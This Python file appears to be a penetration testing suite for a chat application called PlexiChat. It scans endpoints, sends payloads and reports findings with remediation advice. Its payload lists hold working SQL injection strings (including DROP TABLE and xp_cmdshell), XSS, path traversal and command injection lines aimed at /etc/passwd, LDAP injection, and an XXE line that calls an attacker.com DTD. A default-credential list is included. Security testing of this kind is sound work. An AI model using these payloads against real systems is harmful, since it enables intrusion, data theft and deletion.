"""
Advanced Penetration Testing Suite for PlexiChat
Comprehensive security testing with advanced attack vectors and vulnerability assessment.
"""

import asyncio
import json
import logging
import random
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import httpx
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities to test for."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    AUTHENTICATION_BYPASS = "auth_bypass"
    AUTHORIZATION_BYPASS = "authz_bypass"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XML_INJECTION = "xml_injection"
    SSRF = "ssrf"
    XXE = "xxe"
    DESERIALIZATION = "deserialization"
    RACE_CONDITION = "race_condition"
    TIMING_ATTACK = "timing_attack"
    BRUTE_FORCE = "brute_force"
    SESSION_FIXATION = "session_fixation"
    CLICKJACKING = "clickjacking"
    CORS_MISCONFIGURATION = "cors_misconfiguration"
    SECURITY_HEADERS = "security_headers"
    TLS_CONFIGURATION = "tls_configuration"


class SeverityLevel(Enum):
    """Severity levels for vulnerabilities."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class VulnerabilityResult:
    """Result of a vulnerability test."""
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    endpoint: str
    method: str
    payload: str
    description: str
    evidence: str
    remediation: str
    cve_references: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class PenetrationTestReport:
    """Comprehensive penetration test report."""
    target_url: str
    start_time: datetime
    end_time: Optional[datetime] = None
    vulnerabilities: List[VulnerabilityResult] = field(default_factory=list)
    endpoints_tested: int = 0
    tests_performed: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    info_count: int = 0


class AdvancedPenetrationTester:
    """Advanced penetration testing suite with comprehensive attack vectors."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
        # Configure session with retries
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set realistic user agent
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.report = PenetrationTestReport(
            target_url=base_url,
            start_time=datetime.now()
        )
        
        # Load attack payloads
        self._load_attack_payloads()
        
        # Common endpoints to test
        self.common_endpoints = [
            "/api/v1/auth/login",
            "/api/v1/auth/register",
            "/api/v1/auth/logout",
            "/api/v1/users",
            "/api/v1/users/me",
            "/api/v1/admin",
            "/api/v1/messages",
            "/api/v1/files",
            "/api/v1/status",
            "/api/v1/health",
            "/api/v1/version",
            "/docs",
            "/admin",
            "/login",
            "/register",
            "/.env",
            "/config",
            "/backup",
            "/debug"
        ]
    
    def _load_attack_payloads(self):
        """Load comprehensive attack payloads for different vulnerability types."""
        self.payloads = {
            VulnerabilityType.SQL_INJECTION: [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT username,password FROM users --",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1#",
                "' OR 1=1--",
                "' OR 1=1/*",
                "') OR '1'='1--",
                "') OR ('1'='1--",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "1' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
                "1' WAITFOR DELAY '00:00:05' --",
                "1'; EXEC xp_cmdshell('ping 127.0.0.1'); --"
            ],
            
            VulnerabilityType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'-alert('XSS')-'",
                "\";alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>"
            ],
            
            VulnerabilityType.DIRECTORY_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd",
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
            ],
            
            VulnerabilityType.COMMAND_INJECTION: [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "; cat /etc/passwd #",
                "| cat /etc/passwd #",
                "&& cat /etc/passwd #",
                "`whoami`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "| ping -c 4 127.0.0.1",
                "&& ping -c 4 127.0.0.1",
                "; sleep 5",
                "| sleep 5",
                "&& sleep 5"
            ],
            
            VulnerabilityType.LDAP_INJECTION: [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*)(|(objectClass=*))",
                "*))(|(cn=*))",
                "*))%00",
                "admin*",
                "admin))(|(uid=*"
            ],
            
            VulnerabilityType.XML_INJECTION: [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>",
                "<![CDATA[<script>alert('XSS')</script>]]>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
            ]
        }
    
    async def run_comprehensive_test(self) -> PenetrationTestReport:
        """Run comprehensive penetration testing suite."""
        logger.info(f"Starting comprehensive penetration test on {self.base_url}")
        
        try:
            # Test endpoint discovery
            await self._discover_endpoints()
            
            # Test for each vulnerability type
            for vuln_type in VulnerabilityType:
                await self._test_vulnerability_type(vuln_type)
            
            # Test security headers
            await self._test_security_headers()
            
            # Test TLS configuration
            await self._test_tls_configuration()
            
            # Test rate limiting
            await self._test_rate_limiting()
            
            # Test authentication mechanisms
            await self._test_authentication()
            
            # Test session management
            await self._test_session_management()
            
        except Exception as e:
            logger.error(f"Error during penetration testing: {e}")
        
        finally:
            self.report.end_time = datetime.now()
            self._calculate_report_statistics()
        
        return self.report
    
    async def _discover_endpoints(self):
        """Discover available endpoints."""
        logger.info("Discovering endpoints...")
        
        discovered_endpoints = []
        
        for endpoint in self.common_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, timeout=10)
                
                if response.status_code != 404:
                    discovered_endpoints.append(endpoint)
                    logger.debug(f"Discovered endpoint: {endpoint} (Status: {response.status_code})")
                
            except Exception as e:
                logger.debug(f"Error testing endpoint {endpoint}: {e}")
        
        self.discovered_endpoints = discovered_endpoints
        self.report.endpoints_tested = len(discovered_endpoints)
        logger.info(f"Discovered {len(discovered_endpoints)} endpoints")

    async def _test_vulnerability_type(self, vuln_type: VulnerabilityType):
        """Test for specific vulnerability type across all endpoints."""
        logger.info(f"Testing for {vuln_type.value} vulnerabilities...")

        if vuln_type not in self.payloads:
            logger.debug(f"No payloads defined for {vuln_type.value}")
            return

        for endpoint in self.discovered_endpoints:
            for payload in self.payloads[vuln_type]:
                await self._test_single_payload(endpoint, vuln_type, payload)
                self.report.tests_performed += 1

                # Add small delay to avoid overwhelming the server
                await asyncio.sleep(0.1)

    async def _test_single_payload(self, endpoint: str, vuln_type: VulnerabilityType, payload: str):
        """Test a single payload against an endpoint."""
        try:
            url = urljoin(self.base_url, endpoint)

            # Test different HTTP methods
            methods_to_test = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']

            for method in methods_to_test:
                vulnerability = await self._execute_payload_test(url, method, vuln_type, payload)
                if vulnerability:
                    self.report.vulnerabilities.append(vulnerability)
                    logger.warning(f"Vulnerability found: {vuln_type.value} in {endpoint}")

        except Exception as e:
            logger.debug(f"Error testing payload {payload} on {endpoint}: {e}")

    async def _execute_payload_test(self, url: str, method: str, vuln_type: VulnerabilityType, payload: str) -> Optional[VulnerabilityResult]:
        """Execute a specific payload test and analyze the response."""
        try:
            # Prepare request data
            data = {}
            params = {}
            headers = {}

            # Inject payload in different locations
            if method == 'GET':
                params = {'q': payload, 'search': payload, 'id': payload}
            else:
                data = {'input': payload, 'data': payload, 'content': payload}

            # Add payload to headers for header injection tests
            if vuln_type in [VulnerabilityType.XSS, VulnerabilityType.COMMAND_INJECTION]:
                headers['X-Test-Header'] = payload

            # Execute request
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )

            # Analyze response for vulnerability indicators
            return self._analyze_response_for_vulnerability(
                response, url, method, vuln_type, payload
            )

        except Exception as e:
            logger.debug(f"Error executing payload test: {e}")
            return None

    def _analyze_response_for_vulnerability(self, response, url: str, method: str, vuln_type: VulnerabilityType, payload: str) -> Optional[VulnerabilityResult]:
        """Analyze HTTP response for vulnerability indicators."""

        # SQL Injection detection
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite_',
                'mssql_', 'odbc_', 'jdbc_', 'error in your sql syntax',
                'mysql server version', 'microsoft ole db provider',
                'unclosed quotation mark', 'quoted string not properly terminated'
            ]

            response_text = response.text.lower()
            for error in sql_errors:
                if error in response_text:
                    return VulnerabilityResult(
                        vulnerability_type=vuln_type,
                        severity=SeverityLevel.HIGH,
                        endpoint=url,
                        method=method,
                        payload=payload,
                        description=f"SQL injection vulnerability detected via error message: {error}",
                        evidence=f"Response contains SQL error: {error}",
                        remediation="Use parameterized queries and input validation",
                        cve_references=["CWE-89"]
                    )

        # XSS detection
        elif vuln_type == VulnerabilityType.XSS:
            # Check if payload is reflected in response
            if payload in response.text and response.headers.get('content-type', '').startswith('text/html'):
                return VulnerabilityResult(
                    vulnerability_type=vuln_type,
                    severity=SeverityLevel.MEDIUM,
                    endpoint=url,
                    method=method,
                    payload=payload,
                    description="Cross-Site Scripting (XSS) vulnerability detected",
                    evidence=f"Payload '{payload}' reflected in HTML response",
                    remediation="Implement proper output encoding and Content Security Policy",
                    cve_references=["CWE-79"]
                )

        # Directory Traversal detection
        elif vuln_type == VulnerabilityType.DIRECTORY_TRAVERSAL:
            traversal_indicators = ['root:', 'daemon:', '[boot loader]', 'windows registry']
            response_text = response.text.lower()

            for indicator in traversal_indicators:
                if indicator in response_text:
                    return VulnerabilityResult(
                        vulnerability_type=vuln_type,
                        severity=SeverityLevel.HIGH,
                        endpoint=url,
                        method=method,
                        payload=payload,
                        description="Directory traversal vulnerability detected",
                        evidence=f"System file content detected: {indicator}",
                        remediation="Implement proper input validation and file access controls",
                        cve_references=["CWE-22"]
                    )

        # Command Injection detection
        elif vuln_type == VulnerabilityType.COMMAND_INJECTION:
            command_indicators = ['uid=', 'gid=', 'groups=', 'total ', 'volume serial number']
            response_text = response.text.lower()

            for indicator in command_indicators:
                if indicator in response_text:
                    return VulnerabilityResult(
                        vulnerability_type=vuln_type,
                        severity=SeverityLevel.CRITICAL,
                        endpoint=url,
                        method=method,
                        payload=payload,
                        description="Command injection vulnerability detected",
                        evidence=f"Command output detected: {indicator}",
                        remediation="Implement proper input validation and avoid system calls",
                        cve_references=["CWE-78"]
                    )

        # Check for timing-based vulnerabilities
        if response.elapsed.total_seconds() > 5:
            return VulnerabilityResult(
                vulnerability_type=VulnerabilityType.TIMING_ATTACK,
                severity=SeverityLevel.MEDIUM,
                endpoint=url,
                method=method,
                payload=payload,
                description="Potential timing-based vulnerability detected",
                evidence=f"Response time: {response.elapsed.total_seconds():.2f} seconds",
                remediation="Implement consistent response times for all operations",
                cve_references=["CWE-208"]
            )

        return None

    async def _test_security_headers(self):
        """Test for security headers."""
        logger.info("Testing security headers...")

        try:
            response = self.session.get(self.base_url, timeout=10)
            headers = response.headers

            # Check for missing security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': None,
                'Content-Security-Policy': None,
                'Referrer-Policy': None
            }

            for header, expected_value in security_headers.items():
                if header not in headers:
                    self.report.vulnerabilities.append(VulnerabilityResult(
                        vulnerability_type=VulnerabilityType.SECURITY_HEADERS,
                        severity=SeverityLevel.MEDIUM,
                        endpoint=self.base_url,
                        method='GET',
                        payload='',
                        description=f"Missing security header: {header}",
                        evidence=f"Header '{header}' not present in response",
                        remediation=f"Add '{header}' header to all responses",
                        cve_references=["CWE-693"]
                    ))

        except Exception as e:
            logger.error(f"Error testing security headers: {e}")

    async def _test_tls_configuration(self):
        """Test TLS configuration."""
        logger.info("Testing TLS configuration...")

        if not self.base_url.startswith('https://'):
            self.report.vulnerabilities.append(VulnerabilityResult(
                vulnerability_type=VulnerabilityType.TLS_CONFIGURATION,
                severity=SeverityLevel.HIGH,
                endpoint=self.base_url,
                method='GET',
                payload='',
                description="Application not using HTTPS",
                evidence="Base URL uses HTTP instead of HTTPS",
                remediation="Configure HTTPS with valid SSL/TLS certificate",
                cve_references=["CWE-319"]
            ))

    async def _test_rate_limiting(self):
        """Test rate limiting mechanisms."""
        logger.info("Testing rate limiting...")

        try:
            # Send rapid requests to test rate limiting
            endpoint = urljoin(self.base_url, '/api/v1/status')
            responses = []

            for i in range(20):
                response = self.session.get(endpoint, timeout=5)
                responses.append(response.status_code)
                await asyncio.sleep(0.1)

            # Check if any requests were rate limited
            rate_limited = any(code == 429 for code in responses)

            if not rate_limited:
                self.report.vulnerabilities.append(VulnerabilityResult(
                    vulnerability_type=VulnerabilityType.BRUTE_FORCE,
                    severity=SeverityLevel.MEDIUM,
                    endpoint=endpoint,
                    method='GET',
                    payload='',
                    description="No rate limiting detected",
                    evidence="20 rapid requests completed without rate limiting",
                    remediation="Implement rate limiting to prevent abuse",
                    cve_references=["CWE-307"]
                ))

        except Exception as e:
            logger.error(f"Error testing rate limiting: {e}")

    async def _test_authentication(self):
        """Test authentication mechanisms."""
        logger.info("Testing authentication mechanisms...")

        # Test for default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest')
        ]

        login_endpoint = urljoin(self.base_url, '/api/v1/auth/login')

        for username, password in default_creds:
            try:
                response = self.session.post(
                    login_endpoint,
                    json={'username': username, 'password': password},
                    timeout=10
                )

                if response.status_code == 200:
                    self.report.vulnerabilities.append(VulnerabilityResult(
                        vulnerability_type=VulnerabilityType.AUTHENTICATION_BYPASS,
                        severity=SeverityLevel.CRITICAL,
                        endpoint=login_endpoint,
                        method='POST',
                        payload=f"username: {username}, password: {password}",
                        description="Default credentials accepted",
                        evidence=f"Login successful with {username}:{password}",
                        remediation="Remove default accounts or enforce strong passwords",
                        cve_references=["CWE-521"]
                    ))

            except Exception as e:
                logger.debug(f"Error testing credentials {username}:{password}: {e}")

    async def _test_session_management(self):
        """Test session management."""
        logger.info("Testing session management...")

        # Test for session fixation
        try:
            # Get initial session
            response1 = self.session.get(self.base_url, timeout=10)
            initial_cookies = response1.cookies

            # Attempt login (this might fail, but we're testing session handling)
            login_endpoint = urljoin(self.base_url, '/api/v1/auth/login')
            self.session.post(
                login_endpoint,
                json={'username': 'test', 'password': 'test'},
                timeout=10
            )

            # Check if session ID changed after login attempt
            response2 = self.session.get(self.base_url, timeout=10)
            final_cookies = response2.cookies

            # Compare session cookies
            session_changed = False
            for cookie_name in ['sessionid', 'session', 'JSESSIONID', 'PHPSESSID']:
                if (cookie_name in initial_cookies and
                    cookie_name in final_cookies and
                    initial_cookies[cookie_name] != final_cookies[cookie_name]):
                    session_changed = True
                    break

            if not session_changed:
                self.report.vulnerabilities.append(VulnerabilityResult(
                    vulnerability_type=VulnerabilityType.SESSION_FIXATION,
                    severity=SeverityLevel.MEDIUM,
                    endpoint=login_endpoint,
                    method='POST',
                    payload='',
                    description="Session ID not regenerated after login",
                    evidence="Session cookie remains the same before and after login",
                    remediation="Regenerate session ID after successful authentication",
                    cve_references=["CWE-384"]
                ))

        except Exception as e:
            logger.error(f"Error testing session management: {e}")

    def _calculate_report_statistics(self):
        """Calculate vulnerability statistics for the report."""
        for vuln in self.report.vulnerabilities:
            if vuln.severity == SeverityLevel.CRITICAL:
                self.report.critical_count += 1
            elif vuln.severity == SeverityLevel.HIGH:
                self.report.high_count += 1
            elif vuln.severity == SeverityLevel.MEDIUM:
                self.report.medium_count += 1
            elif vuln.severity == SeverityLevel.LOW:
                self.report.low_count += 1
            elif vuln.severity == SeverityLevel.INFO:
                self.report.info_count += 1

    def generate_report(self, format: str = 'json') -> str:
        """Generate penetration test report in specified format."""
        if format.lower() == 'json':
            return self._generate_json_report()
        elif format.lower() == 'html':
            return self._generate_html_report()
        else:
            return self._generate_text_report()

    def _generate_json_report(self) -> str:
        """Generate JSON format report."""
        report_data = {
            'target_url': self.report.target_url,
            'start_time': self.report.start_time.isoformat(),
            'end_time': self.report.end_time.isoformat() if self.report.end_time else None,
            'summary': {
                'endpoints_tested': self.report.endpoints_tested,
                'tests_performed': self.report.tests_performed,
                'vulnerabilities_found': len(self.report.vulnerabilities),
                'critical': self.report.critical_count,
                'high': self.report.high_count,
                'medium': self.report.medium_count,
                'low': self.report.low_count,
                'info': self.report.info_count
            },
            'vulnerabilities': [
                {
                    'type': vuln.vulnerability_type.value,
                    'severity': vuln.severity.value,
                    'endpoint': vuln.endpoint,
                    'method': vuln.method,
                    'payload': vuln.payload,
                    'description': vuln.description,
                    'evidence': vuln.evidence,
                    'remediation': vuln.remediation,
                    'cve_references': vuln.cve_references,
                    'timestamp': vuln.timestamp.isoformat()
                }
                for vuln in self.report.vulnerabilities
            ]
        }

        return json.dumps(report_data, indent=2)

    def _generate_text_report(self) -> str:
        """Generate plain text report."""
        lines = [
            "=" * 80,
            "PLEXICHAT ADVANCED PENETRATION TEST REPORT",
            "=" * 80,
            f"Target: {self.report.target_url}",
            f"Start Time: {self.report.start_time}",
            f"End Time: {self.report.end_time}",
            f"Duration: {self.report.end_time - self.report.start_time if self.report.end_time else 'N/A'}",
            "",
            "SUMMARY:",
            f"  Endpoints Tested: {self.report.endpoints_tested}",
            f"  Tests Performed: {self.report.tests_performed}",
            f"  Vulnerabilities Found: {len(self.report.vulnerabilities)}",
            f"    Critical: {self.report.critical_count}",
            f"    High: {self.report.high_count}",
            f"    Medium: {self.report.medium_count}",
            f"    Low: {self.report.low_count}",
            f"    Info: {self.report.info_count}",
            "",
            "VULNERABILITIES:",
            "-" * 80
        ]

        for i, vuln in enumerate(self.report.vulnerabilities, 1):
            lines.extend([
                f"{i}. {vuln.vulnerability_type.value.upper()} - {vuln.severity.value.upper()}",
                f"   Endpoint: {vuln.endpoint}",
                f"   Method: {vuln.method}",
                f"   Description: {vuln.description}",
                f"   Evidence: {vuln.evidence}",
                f"   Remediation: {vuln.remediation}",
                f"   CVE References: {', '.join(vuln.cve_references)}",
                ""
            ])

        return "\n".join(lines)
